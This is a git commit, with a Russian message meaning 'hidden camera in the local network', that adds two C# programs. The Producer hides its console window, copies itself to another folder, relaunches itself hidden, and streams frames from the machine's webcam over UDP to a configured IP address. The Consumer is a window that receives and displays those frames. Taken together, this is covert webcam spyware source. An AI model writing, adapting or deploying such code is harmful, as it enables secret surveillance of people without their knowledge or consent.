da196ddb50ed5c68b3bd8b71a55ee269648cd726
Alexrus-cyber <85308640+Alexrus-cyber@users.noreply.github.com>
2022-03-18 19:08:01 +0300

    Скрытая камера в локальной сети

---
+++ Consumer/MainWindow.xaml.cs
@@ -0,0 +1,72 @@
+﻿using System.Configuration;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Windows;
+using System.Windows.Forms;
+using System.Windows.Input;
+using System.Windows.Media.Imaging;
+
+
+namespace Consumer
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+ 
+
+        public MainWindow()
+        {
+            InitializeComponent();
+
+           
+
+        }
+        public string Text { get; private set; }
+
+        private async void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            System.Windows.Forms.Integration.WindowsFormsHost host =
+       new System.Windows.Forms.Integration.WindowsFormsHost();
+
+            // Create the MaskedTextBox control.
+            PictureBox mtbDate = new PictureBox();
+
+            // Assign the MaskedTextBox control as the host control's child.
+            host.Child = mtbDate;
+
+            // Add the interop host control to the Grid
+            // control's collection of child controls.
+            mtbDate.Width = 1000;
+            mtbDate.Height = 700;
+            this.Top.Children.Add(host);
+
+            var port = int.Parse(ConfigurationManager.AppSettings.Get("port"));
+            var client = new UdpClient(port);
+
+            while (true)
+            {
+                var data = await client.ReceiveAsync();
+                using (var ms = new MemoryStream(data.Buffer))
+                {
+                    mtbDate.Image = new Bitmap(ms);
+                }
+                Text = $"Bytes received: {data.Buffer.Length * sizeof(byte)}";
+            }
+        }
+
+        private void Window_MouseDoubleClick(object sender, MouseButtonEventArgs e)
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            System.Windows.MessageBox.Show(string.Join("\n", host.AddressList.
+                Where(i => i.AddressFamily == AddressFamily.InterNetwork)
+                .Select(i => i.ToString())));
+        }
+
+    }
+}
+
---
+++ Producer/Program.cs
@@ -0,0 +1,115 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Configuration;
+using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using AForge.Video;
+using AForge.Video.DirectShow;
+
+namespace Producer
+{
+    class Program
+    {
+        public static int SW_HIDE = 5;
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+
+
+        private static IPEndPoint consumerEndPoint;
+
+        public static UdpClient udpClient = new UdpClient();
+
+        static void Main(string[] args)
+        {
+            var consumerIp = ConfigurationManager.AppSettings.Get("consumerIp");
+            var consumerPort = int.Parse(ConfigurationManager.AppSettings.Get("consumerPort"));
+            consumerEndPoint = new IPEndPoint(IPAddress.Parse(consumerIp), consumerPort);
+            if (args.Length > 0 && args[0].Equals("hide"))
+            {
+                consumerPort=9909;
+                SW_HIDE = 0;
+            }
+            else
+            {
+                ShowWindow(GetConsoleWindow(), SW_HIDE);
+                string path = Directory.GetCurrentDirectory();
+                string stop = "/stop";
+               
+               
+                CopyDirectoriesAndFiles(path, stop);
+                //Process.Start(stop + "/Producer.exe");
+                var p = new Process();
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/k " + stop + "/Producer.exe" + " hide";
+                p.Start();
+                SW_HIDE = 0;
+                
+            }
+            
+
+            Console.WriteLine($"consumer : {consumerEndPoint}");
+            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+            videoSource.NewFrame += VideoSource_NewFrame;
+            videoSource.Start();
+
+
+
+
+            ShowWindow(GetConsoleWindow(), SW_HIDE);
+           
+        }
+
+        private static void VideoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
+        {
+            var bmp = new Bitmap(eventArgs.Frame, 800, 600);
+            try
+            {
+                using (var ms = new MemoryStream())
+                {
+                    bmp.Save(ms, ImageFormat.Jpeg);
+                    var bytes = ms.ToArray();
+                    udpClient.Send(bytes, bytes.Length, consumerEndPoint);
+                }
+            }
+            catch (Exception)
+            {
+                throw;
+            }
+        }
+        public static void CopyDirectoriesAndFiles(String RootDirectory, String DestinationDirectory)
+        {
+            if (!Directory.Exists(DestinationDirectory))
+                Directory.CreateDirectory(DestinationDirectory);
+
+            DirectoryInfo dirInfo = new DirectoryInfo(RootDirectory);
+            DirectoryInfo[] dirInfos = dirInfo.GetDirectories();
+
+            FileInfo[] fileInfos = dirInfo.GetFiles();
+            for (int i = 0; i < fileInfos.Length; i++)
+            {
+                try { File.Copy(fileInfos[i].FullName, Path.Combine(DestinationDirectory, fileInfos[i].Name)); }
+                catch (IOException ioExc) { Console.WriteLine(ioExc.Message); }
+
+            }
+
+            for (int i = 0; i < dirInfos.Length; i++)
+            {
+                try { Directory.CreateDirectory(Path.Combine(DestinationDirectory, dirInfos[i].Name)); }
+                catch (IOException ioExc) { Console.WriteLine(ioExc.Message); }
+                CopyDirectoriesAndFiles(dirInfos[i].FullName, Path.Combine(DestinationDirectory, dirInfos[i].Name));
+            }
+        }
+    }
+}
